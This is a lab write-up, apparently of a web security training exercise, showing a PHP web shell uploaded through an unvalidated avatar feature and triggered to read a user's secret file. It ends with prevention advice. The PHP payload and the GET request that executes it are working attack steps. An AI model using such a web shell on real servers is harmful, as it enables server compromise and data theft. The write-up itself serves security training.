# 💻 Remote Code Execution — Web Shell Upload via Insecure Avatar Functionality

## 🎯 Objective
- Exploit insecure file upload validation to:
  - Upload executable server-side code
  - Achieve remote code execution (RCE)
  - Access restricted server files
  - Extract sensitive user secrets

---

## ❗ Why This Matters

- File upload flaws can lead to:
  - Arbitrary code execution
  - Full server compromise
  - Credential theft
  - Lateral movement
- Web shells are among the most critical upload vulnerabilities

---

## 🧪 Exercises Performed

# 🔍 Part 1 — Application Functionality Analysis

## 1️⃣ Login and Avatar Feature

### Credentials:

```text 
wiener:peter
````

---

### Observation:

- ✔️ Avatar upload allowed
- ✔️ Uploaded image publicly accessible

---

# 🚀 Part 2 — Uploaded File Location Discovery

## 2. HTTP History Filter:

* MIME Type → Images

---

### Identified Path:

```http 
/files/avatars/<uploaded-file>
```

---

### Security Insight:

```text
Uploaded files are stored in web-accessible directory
```

---

# 🚀 Part 3 — Malicious PHP Payload Creation

## 3️⃣ Local Payload File

### Filename:

```php 
exploit.php
```

---

### Payload:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Function:

- ✔️ Reads Carlos’s secret file
- ✔️ Outputs contents directly

---

# 🚀 Part 4 — Upload Web Shell

## 4️⃣ Avatar Upload

### Action:

- Upload `exploit.php`

---

### Result:

- ✔️ Upload accepted
- ✔️ Server stores PHP file without validation

---

## ⚠️ Vulnerability Insight

```text 
Server fails to restrict executable extensions
```

---

# 🚀 Part 5 — Trigger Remote Code Execution

## 5️⃣ Access Uploaded Shell

```http 
GET /files/avatars/exploit.php
```

---

### Result:

- ✔️ PHP executed server-side
- ✔️ Carlos’s secret returned

---

### Outcome:

- ✔️ Sensitive file disclosure
- ✔️ Remote code execution achieved
- ✔️ Lab solved 🎉

---

## 🏁 Lab Completion

* Upload functionality analyzed
* Web-accessible storage discovered
* PHP web shell uploaded
* Server-side execution achieved
* Sensitive data extracted

---

## 🧠 Key Takeaways

* File extension validation is essential
* Public upload directories are dangerous
* Server-side execution permissions dramatically increase impact
* MIME checks alone are insufficient
* Uploads must be sandboxed

---

## 🔥 Core Vulnerability

```text 
Unrestricted executable file upload enabled full remote code execution via avatar upload
```

---

## 🛡️ Prevention

* Restrict:

  * Allowed extensions
  * MIME types
* Store uploads:

  * Outside web root
* Rename:

  * Uploaded files
* Disable:

  * Script execution in upload directories
* Scan:

  * Uploaded content
* Apply:

  * Least privilege permissions

---

## ⚠️ Security Principle

```text 
If users can upload executable files into web-accessible paths, they control your server
```

---

## 🏁 Status

- ✔️ Lab Completed
